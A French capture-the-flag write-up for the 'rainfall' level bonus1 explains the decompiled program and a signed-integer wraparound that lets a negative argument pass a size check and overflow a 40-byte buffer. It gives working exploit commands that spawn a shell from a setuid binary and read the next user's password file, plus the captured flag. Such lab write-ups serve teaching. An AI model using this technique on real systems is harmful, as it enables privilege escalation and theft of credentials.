# rainfall : [bonus1]

Observations:
---

#### Source décompilée:
```c
int main(int argc, const char **argv, const char **envp)
{
  char dest[40];
  int v5; 

  v5 = atoi(argv[1]);
  if ( v5 > 9 )
    return 1;
  memcpy(dest, argv[2], 4 * v5);
  if ( v5 == 1464814662 )
    execl("/bin/sh", "sh", 0);
  return 0;
}
```

#### Entrées du programme:
| Nom | Description |
| --- | ----------- |
| `argv[1]` | Une chaîne de caractères |
| `argv[2]` | Une chaîne de caractères |

#### Détails du programme:
```bash
-rwsr-s---+ 1 bonus2 users 5043 Mar  6  2016 bonus1
```

#### Fonction:
| Nom | Description |
| --- | ----------- |
| `<main>` | Cette fonction convertis `argv[1]` en entier dans la variable `v5` puis sort de la fonction `<main>` en retournant **1** si `v5` est plus grand que **9**. <br> Elle copie ensuite `(4 * v5)` octets de `argv[2]` dans `dest` qui est un tableau de **40** octets. <br> Pour finir elle compare la valeur de `v5` à la valeur **1464814662**, si la comparaison est correcte la fonction execute `/bin/sh`. |

#### Conclusions:
La première condition est supposée nous empécher de créer un dépassement de mémoire mais nous pouvons outrepasser cela. \
En effet le résultat de `<atoi>` est un entier mais `<memcpy>` prend en paramètre un entier multiplié par **4** qui de plus est convertis en entier non signé. \
Nous pouvons donc trouver une valeur négative qui une fois convertie et multipliée dépassera la limite de **9** . \
Nous permettant ainsi de changer l'ordre d'exécution en écrasant la valeur de `v5`.

----
Résolution:
----
Pour trouver une valeur de `v5` qui une fois multipliée par **4** déborde suffisament pour tomber sur le nombre 44. \
Nous devons viser la valeur **11**, mais nous devons aussi entrer un chiffre négatif pour pouvoir passer la première condition. \
Multiplier par **4** reviens a déplacer un nombre de **2** bits vers la gauche tout en perdant les informations qui débordes. \
Car une fois une analyse du programme plus approfondie en asembleur on peut voir qu'un simple décalage d'adresse est effectué dans la mémoire.

> Cette ligne cause le décalage de bits: '0x8048453 <main+47>     lea    0x0(,%eax,4),%ecx'

Nous pouvons donc écrire le nombre **11** en binaire et mettre le bit le plus grand à **1** pour le transformer en nombre négatif. \
À vrai dire nous pouvons de plus ajouter le bit juste en dessous à **1** vu que la multiplications par **4** reviens à enlever les **2** bits de gauche.\
Les solutions ce trouvant êtres **-1073741813** ou **-2147483637** :
| décimal | binaire |
| ------: | ------: |
|	      11	| 00000000 00000000 00000000 00001011
|-2147483637	| 10000000 00000000 00000000 00001011
|-1073741813	| 11000000 00000000 00000000 00001011

Il ne me reste plus qu'a remplir le buffer de **40** octets aléatoires puis de la valeur de `v5` voulue en hexadécimal et little endiane, ce qui écrasera \
la valeur de `v5` par dépassement de tableau puis ensuite d'ajouter la commande pour afficher la clef de l'utilisateur supérieur.

#### Commandes:
```bash
./bonus1 -2147483637 $(python -c "print('a'*40 +'\x57\x4f\x4c\x46'[::-1])") <<<'cat /home/user/bonus2/.pass'
```
ou
```bash
./bonus1 -1073741813 $(python -c "print('a'*40 +'\x57\x4f\x4c\x46'[::-1])") <<<'cat /home/user/bonus2/.pass'
```

**Flag :** 579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
